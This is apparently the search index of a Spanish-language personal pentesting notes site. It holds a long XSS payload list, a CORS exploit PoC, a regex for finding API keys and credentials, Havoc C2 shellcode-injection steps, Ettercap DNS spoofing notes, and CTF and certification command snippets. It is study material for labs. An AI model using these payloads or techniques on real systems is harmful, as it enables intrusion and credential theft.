{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"$Grunt@-lab","text":"<p>Bienvenido a mi repositorio de apuntes para hacking, certificaciones, nube y programaci\u00f3n. Ac\u00e1 guardo res\u00famenes, comandos \u00fatiles y playbooks que uso mientras estudio o preparo labs.</p> <p> Ver repositorio en GitHub</p> <ul> <li> <p> Ofensiva Fundamentos de explotaci\u00f3n \u00b7 OSCP \u00b7 Windows Hacking \u00b7 PrivEsc Cheatsheet \u00b7 Scripts &amp; Exploits</p> </li> <li> <p> Certificaciones BSCP \u00b7 Practitioner Labs \u00b7 OAuth Hijacking \u00b7 eJPT</p> </li> <li> <p> Cloud &amp; AppSec Cloud Hacking \u00b7 AWS Enumeration \u00b7 AWS Attacking \u00b7 AppSec KPI &amp; Metrics \u00b7 Bug Bounty resources</p> </li> <li> <p> Programaci\u00f3n &amp; AI Rust Programming \u00b7 Closures \u00b7 Smart Pointers \u00b7 AI para Red Teaming \u00b7 ML Fundamentals  \u00b7 Apuntes universitarios</p> </li> <li> <p> Herramientas &amp; miscel\u00e1nea Havoc C2 101 \u00b7 DNS Spoofing \u00b7 Subdomain Enumeration \u00b7 BurpSuite Regex \u00b7 CORS PoC</p> </li> <li> <p> Cheat-sheets varios Android Pentesting \u00b7 XSS Payloads \u00b7 Jobs Interview Tips \u00b7 Gaming settings</p> </li> </ul>"},{"location":"BurpSuite-regex/","title":"BurpSuite Regex Cheatsheet","text":""},{"location":"BurpSuite-regex/#regex-to-put-in-the-burp-search-which-is-pretty-cool-to-search-for-apikeys","title":"regex to put in the burp search which is pretty cool to search for apikeys.","text":"<pre><code>(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\\-,]{0,25})(=|&gt;|:=|\\|\\|:|&lt;=|=&gt;|:).{0,5}['\\\"]([0-9a-zA-Z\\-_=]{8,64})['\\\"]\n</code></pre>"},{"location":"HavocC2/","title":"Quick Start: Havoc Server and Client","text":""},{"location":"HavocC2/#starting-the-server","title":"Starting the Server","text":"<ol> <li>Navigate to the Havoc directory:     <pre><code>cd Havoc\n</code></pre></li> <li>Start the server:     <pre><code>./havoc server -d\n</code></pre></li> <li><code>-d</code> for default profile</li> </ol>"},{"location":"HavocC2/#launching-the-client","title":"Launching the Client","text":"<ol> <li>Navigate to the Havoc directory:     <pre><code>cd Havoc\n</code></pre></li> <li>Launch the client:     <pre><code>./havoc client\n</code></pre></li> </ol>"},{"location":"HavocC2/#creacion-de-agentes","title":"Creaci\u00f3n de agentes","text":"<ul> <li>Attack =&gt; Payload =&gt; Hay que elegir el tipo de payload que queremos<ul> <li>.exe</li> <li>.dll</li> <li>.bin</li> </ul> </li> </ul>"},{"location":"HavocC2/#persistencia-inyectando-shellcode-dentro-de-un-proceso","title":"Persistencia inyectando shellcode dentro de un proceso","text":"<ul> <li>Para ver los procesos activos dale a file explorer =&gt; process list</li> <li>Para armar el payload vamos a Attack =&gt; Payload =&gt; Windows Shellcode</li> <li><code>shellcode inject x64 2668 /home/kali/Desktop/boxes/flight/inject.bin</code></li> </ul>"},{"location":"android-pentesting/","title":"Android Pentesting Setup","text":""},{"location":"android-pentesting/#grunts-personal-blog","title":"Grunt's personal blog","text":""},{"location":"android-pentesting/#android-pentesting","title":"Android pentesting","text":""},{"location":"android-pentesting/#burp-suite-configuration","title":"Burp Suite configuration","text":"<ul> <li> <p>Configure Burp Suite with Android Nougat</p> </li> <li> <p>Troubleshooting help #1</p> </li> <li> <p>Troubleshooting help #2</p> </li> </ul> <p>En el WIFI poner IP de la maquina que corre burp + puerto Por dios como me cost\u00f3 hacer esto y poder hacer andar correctamente en un telefono de prueba, utilic\u00e9 un olivelite XiaoMi REDMI 8A DUAL</p> <p>- ROM: CRdroid (Android 12) + nikGapps + magisk</p>"},{"location":"bug-bounty-resources/","title":"Bug bounty Resources","text":""},{"location":"bug-bounty-resources/#recon","title":"Recon","text":"<ul> <li>Assetfinder - Find domains and subdomains potentially related to a given domain. </li> <li>Subfinder - subdomain discovery tool </li> <li>Prips - tool that can be used to print all of the IP address on a given range </li> <li>JQ - https://stedolan.github.io/jq/ </li> <li>Hakrevdns - simple tool for performing reverse DNS lookups </li> <li>Massdns - simple high-performance DNS stub resolver</li> <li>Shuffledns - https://github.com/projectdiscovery/shuffledns </li> <li>Project Discovery Chaos - https://chaos.projectdiscovery.io/#/ </li> <li>AMASS - https://github.com/OWASP/Amass </li> <li>LazyRecon - https://github.com/nahamsec/lazyrecon</li> <li>HTTPX - fast and multi-purpose HTTP toolkit that allows running multiple</li> </ul>"},{"location":"bug-bounty-resources/#magic-checklist","title":"Magic Checklist","text":"<p>Bug bounty ToDo list by soyelmago Workflows compilation</p>"},{"location":"bug-bounty-resources/#subdomain-live-checker","title":"Subdomain live checker","text":"<pre><code># toma como parametro el archivo con las urls\n# ejemplo: python3 list_websites.py subfinder_starlink.txt\nimport sys\nimport subprocess\n\nwith open(sys.argv[1]) as fp:\n    for line in fp:\n        print(\"voy a probar:\" + line.strip())\n        subprocess.call([\"curl\", \"-i\", \"--connect-timeout\", \"5\", line.strip()])\n        sys.stdout.flush()\n</code></pre>"},{"location":"corsPOC/","title":"CORS PoC","text":""},{"location":"corsPOC/#cors-html-js-poc","title":"CORS HTML + JS PoC","text":"<pre><code>&lt;html&gt;\n   &lt;head&gt;\n      &lt;script&gt;\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 &amp;&amp; this.status == 200) {\n                        document.getElementById(\"emo\").innerHTML = alert(this.responseText);\n            }\n         };\n         xhttp.open(\"GET\", \"endpoint_vulnerable\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      &lt;/script&gt;\n   &lt;/head&gt;\n   &lt;body&gt;\n      &lt;center&gt;\n      &lt;h2&gt;CORS PoC Exploit &lt;/h2&gt;\n      &lt;h3&gt;Show full content of page&lt;/h3&gt;\n      &lt;div id=\"demo\"&gt;\n         &lt;button type=\"button\" onclick=\"cors()\"&gt;Exploit&lt;/button&gt;\n      &lt;/div&gt;\n   &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"dnsSpoofing/","title":"DNS spoofing or Local DNS Cache Poisoning","text":""},{"location":"dnsSpoofing/#desde-una-red-local-un-atacante-podria-envenenar-el-servidor-dns-local-haciendo-un-mitm-con-ettercap-o-bettercap","title":"Desde una red local un atacante podr\u00eda envenenar el servidor DNS local haciendo un MITM con Ettercap o Bettercap","text":"<ul> <li>Para esto hay que editar <code>/etc/ettercap/etter.dns</code></li> <li>Mappear el nombre de dominio que queremos spoofear</li> </ul> <p>Ejemplo de HTB academy <pre><code>GNT@htb[/htb]# cat /etc/ettercap/etter.dns\n\ninlanefreight.com      A   192.168.225.110\n*.inlanefreight.com    A   192.168.225.110\n</code></pre></p> <ul> <li>Inicias y le das a escanear</li> <li>La IP de la victima va a target1 y el gateway a target2</li> <li>Plugins &gt; Manage Plugins y dns_spoof activado.<ul> <li>Esto manda a la maquina objetivo la resoluci\u00f3n DNS falsa.</li> </ul> </li> </ul> <p>Video corto y explicativo</p>"},{"location":"ejpt/","title":"eJPT Notes","text":"<p>I passed the ejpt certification exam, here I am going to put small utilities that helped me to pass. LINK</p> <p>add route static ejpt:  <code>ip route add IP.0/24 dev tun0</code></p> <ul> <li>MySQL </li> </ul> <pre><code>#Connecting database to site\nmysql -u USERNAME -p PASSWORD -h HOST DB\n\n#Selecting Database\nuse &lt;db_name&gt;\n\n#viewing tables\nshow tables;\n\n#select the tables\nselect * from &lt;table_name&gt;\n</code></pre> <ul> <li> <p>John the ripper <code>john --wordlist=/path/to/wordlist --users=users.txt hashfile</code></p> </li> <li> <p>Enum4Linux <code>enum4linux -a IP</code></p> </li> </ul>"},{"location":"privilege-escalation-linux-assistance/","title":"PrivEsc Cheatsheet","text":"<p>find suid on linux: <code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code></p> <p>pspy - unprivileged Linux process snooping LINK Cronjobs, scripts, etc</p>"},{"location":"subdomain-enumeration/","title":"Subdomain Enumeration","text":""},{"location":"subdomain-enumeration/#sirve-para-ctfs-o-entornos-controlados","title":"Sirve para CTFs o \"entornos controlados\"","text":"<pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H Host:FUZZ.ejemplo.com -u http://ejemplo.com -fw 125\n</code></pre>"},{"location":"subdomain-enumeration/#pro-tip","title":"Pro tip:","text":""},{"location":"subdomain-enumeration/#para-ctfs-con-sublist3r-se-puede-cambiar-el-htb-thm-por-com-y-es-probable-que-encuentre-verdaderos-subdominios","title":"Para CTFS con sublist3r se puede cambiar el .htb // .thm por .com y es probable que encuentre verdaderos subdominios","text":""},{"location":"xss/","title":"XSS detection payloads","text":""},{"location":"xss/#i-do-not-recommend-any-automated-xss-detection-tool-for-professional-purposes","title":"I do not recommend any automated XSS detection tool for professional purposes.","text":""},{"location":"xss/#xss-payload-list","title":"XSS Payload List :","text":"<pre><code>&lt;!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List --&gt;\n&lt;!--        Author : Ismail Tasdelen --&gt;\n&lt;!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ --&gt;\n&lt;!--        GitHub : https://github.com/ismailtasdelen/ --&gt;\n&lt;!--       Twitter : https://twitter.com/ismailtsdln --&gt;\n&lt;!--        Medium : https://medium.com/@ismailtasdelen --&gt;\n\n\"-prompt(8)-\"\n'-prompt(8)-'\n\";a=prompt,a()//\n';a=prompt,a()//\n'-eval(\"window['pro'%2B'mpt'](8)\")-'\n\"-eval(\"window['pro'%2B'mpt'](8)\")-\"\n\"onclick=prompt(8)&gt;\"@x.y\n\"onclick=prompt(8)&gt;&lt;svg/onload=prompt(8)&gt;\"@x.y\n&lt;image/src/onerror=prompt(8)&gt;\n&lt;img/src/onerror=prompt(8)&gt;\n&lt;image src/onerror=prompt(8)&gt;\n&lt;img src/onerror=prompt(8)&gt;\n&lt;image src =q onerror=prompt(8)&gt;\n&lt;img src =q onerror=prompt(8)&gt;\n&lt;/scrip&lt;/script&gt;t&gt;&lt;img src =q onerror=prompt(8)&gt;\n&lt;script\\x20type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Dtype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x09type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Ctype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x2Ftype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Atype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n'`\"&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        \n'`\"&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;\n&lt;img src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/img&gt;\n&lt;audio src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/audio&gt;\n&lt;video src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/video&gt;\n&lt;body src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/body&gt;\n&lt;image src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/image&gt;\n&lt;object src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/object&gt;\n&lt;script src=1 href=1 onerror=\"javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;svg onResize svg onResize=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onResize&gt;\n&lt;title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/title onPropertyChange&gt;\n&lt;iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onLoad&gt;\n&lt;body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseEnter&gt;\n&lt;body onFocus body onFocus=\"javascript:javascript:alert(1)\"&gt;&lt;/body onFocus&gt;\n&lt;frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onScroll&gt;\n&lt;script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/script onReadyStateChange&gt;\n&lt;html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseUp&gt;\n&lt;body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPropertyChange&gt;\n&lt;svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onLoad&gt;\n&lt;body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPageHide&gt;\n&lt;body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseOver&gt;\n&lt;body onUnload body onUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onUnload&gt;\n&lt;body onLoad body onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/body onLoad&gt;\n&lt;bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/bgsound onPropertyChange&gt;\n&lt;html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseLeave&gt;\n&lt;html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseWheel&gt;\n&lt;style onLoad style onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/style onLoad&gt;\n&lt;iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onReadyStateChange&gt;\n&lt;body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPageShow&gt;\n&lt;style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/style onReadyStateChange&gt;\n&lt;frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onFocus&gt;\n&lt;applet onError applet onError=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onError&gt;\n&lt;marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"&gt;&lt;/marquee onStart&gt;\n&lt;script onLoad script onLoad=\"javascript:javascript:alert(1)\"&gt;&lt;/script onLoad&gt;\n&lt;html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseOver&gt;\n&lt;html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"&gt;&lt;/html onMouseEnter&gt;\n&lt;body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onBeforeUnload&gt;\n&lt;html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseDown&gt;\n&lt;marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"&gt;&lt;/marquee onScroll&gt;\n&lt;xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"&gt;&lt;/xml onPropertyChange&gt;\n&lt;frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"&gt;&lt;/frameset onBlur&gt;\n&lt;applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onReadyStateChange&gt;\n&lt;svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onUnload&gt;\n&lt;html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseOut&gt;\n&lt;body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"&gt;&lt;/body onMouseMove&gt;\n&lt;body onResize body onResize=\"javascript:javascript:alert(1)\"&gt;&lt;/body onResize&gt;\n&lt;object onError object onError=\"javascript:javascript:alert(1)\"&gt;&lt;/object onError&gt;\n&lt;body onPopState body onPopState=\"javascript:javascript:alert(1)\"&gt;&lt;/body onPopState&gt;\n&lt;html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"&gt;&lt;/html onMouseMove&gt;\n&lt;applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onreadystatechange&gt;\n&lt;body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"&gt;&lt;/body onpagehide&gt;\n&lt;svg onunload svg onunload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onunload&gt;\n&lt;applet onerror applet onerror=\"javascript:javascript:alert(1)\"&gt;&lt;/applet onerror&gt;\n&lt;body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"&gt;&lt;/body onkeyup&gt;\n&lt;body onunload body onunload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onunload&gt;\n&lt;iframe onload iframe onload=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onload&gt;\n&lt;body onload body onload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onload&gt;\n&lt;html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"&gt;&lt;/html onmouseover&gt;\n&lt;object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"&gt;&lt;/object onbeforeload&gt;\n&lt;body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"&gt;&lt;/body onbeforeunload&gt;\n&lt;body onfocus body onfocus=\"javascript:javascript:alert(1)\"&gt;&lt;/body onfocus&gt;\n&lt;body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"&gt;&lt;/body onkeydown&gt;\n&lt;iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe onbeforeload&gt;\n&lt;iframe src iframe src=\"javascript:javascript:alert(1)\"&gt;&lt;/iframe src&gt;\n&lt;svg onload svg onload=\"javascript:javascript:alert(1)\"&gt;&lt;/svg onload&gt;\n&lt;html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"&gt;&lt;/html onmousemove&gt;\n&lt;body onblur body onblur=\"javascript:javascript:alert(1)\"&gt;&lt;/body onblur&gt;\n\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;\n'\"`&gt;&lt;script&gt;/* *\\x2Fjavascript:alert(1)// */&lt;/script&gt;\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0D\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0A\n&lt;script&gt;javascript:alert(1)&lt;/script\\x0B\n&lt;script charset=\"\\x22&gt;javascript:alert(1)&lt;/script&gt;\n&lt;!--\\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n--&gt;&lt;!-- --\\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;\n`\"'&gt;&lt;img src='#\\x27 onerror=javascript:alert(1)&gt;\n&lt;a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n\"'`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a='hello\\x27;javascript:alert(1)//';&lt;/script&gt;&lt;/p&gt;\n&lt;a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javas\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;script&gt;/* *\\x2A/javascript:alert(1)// */&lt;/script&gt;\n&lt;script&gt;/* *\\x00/javascript:alert(1)// */&lt;/script&gt;\n&lt;style&gt;&lt;/style\\x3E&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x0D&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x09&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x20&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n&lt;style&gt;&lt;/style\\x0A&lt;img src=\"about:blank\" onerror=javascript:alert(1)//&gt;&lt;/style&gt;\n\"'`&gt;ABC&lt;div style=\"font-family:'foo'\\x7Dx:expression(javascript:alert(1);/*';\"&gt;DEF \n\"'`&gt;ABC&lt;div style=\"font-family:'foo'\\x3Bx:expression(javascript:alert(1);/*';\"&gt;DEF \n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n&lt;script&gt;if(\"x\\\\xE1\\x96\\x89\".length==2) { javascript:alert(1);}&lt;/script&gt;\n&lt;script&gt;if(\"x\\\\xE0\\xB9\\x92\".length==2) { javascript:alert(1);}&lt;/script&gt;\n&lt;script&gt;if(\"x\\\\xEE\\xA9\\x93\".length==2) { javascript:alert(1);}&lt;/script&gt;\n'`\"&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;\n'`\"&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;\n\"'`&gt;&lt;\\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;\n\"'`&gt;&lt;\\x00img src=xxx:x onerror=javascript:alert(1)&gt;\n&lt;script src=\"data:text/plain\\x2Cjavascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xD4\\x8F,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xE0\\xA4\\x98,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script src=\"data:\\xCB\\x8F,javascript:alert(1)\"&gt;&lt;/script&gt;\n&lt;script\\x20type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Dtype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x09type=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Ctype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x2Ftype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x0Atype=\"text/javascript\"&gt;javascript:alert(1);&lt;/script&gt;\nABC&lt;div style=\"x\\x3Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:expression\\x5C(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:expression\\x00(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:exp\\x00ression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:exp\\x5Cression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x09expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Dexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Cexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x20expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x00expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\x0Bexpression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\"&gt;DEF\nABC&lt;div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\"&gt;DEF\n&lt;a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Ajavascript:javascript:alert(1)\" 